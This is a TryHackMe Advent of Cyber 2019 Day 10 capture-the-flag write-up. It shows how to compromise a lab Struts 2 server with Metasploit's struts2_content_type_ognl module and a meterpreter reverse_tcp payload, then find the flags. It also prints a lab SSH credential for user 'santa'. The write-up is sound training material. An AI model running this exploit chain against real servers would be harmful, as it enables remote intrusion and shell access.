---
title: "TryHackMe Advent of Cyber 2019 Day 10"
date: 2019-12-10
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 10"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-10/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-10
---

# Metrasploit and Struts2

```text
nmap
22
80
111
```

```text
Nmap reveals a web service running on port 80/tcp, identified as Apache Tomcat/Coyote JSP engine 1.1. When we connect to the web server, we are redirected to /showcase.action.

Googling for the terms "apache" and "showcase.action" confirms that the server is probably running "Struts 2"
```

```text
search struts2
use 0 but not worked
use exploit/multi/http/struts2_content_type_ognl
set rhosts
set rport
set lhost
set TARGETURI /showcase.action
set payload linux/x64/meterpreter/reverse_tcp
got meterpreter
```

```text
to run find command use---> shell
find / 2>/dev/null -i flag  [-i ignor case]
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
```

```text
ssh      -via /home/santa
santa:rudolphrednosedreindeer
```

## Task

- Compromise the web server using Metasploit. What is flag1?
```text
[redacted challenge flag]
```

- Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
```text
[redacted sensitive answer]
```

- Who is on line 148 of the naughty list?
```text
Melisa Vanhoose      --via sed -n 148p ./< naughty list >
```

- Who is on line 52 of the nice list?
```text
Lindsey Gaffney      --via sed -n 52p ./< nice list >
```
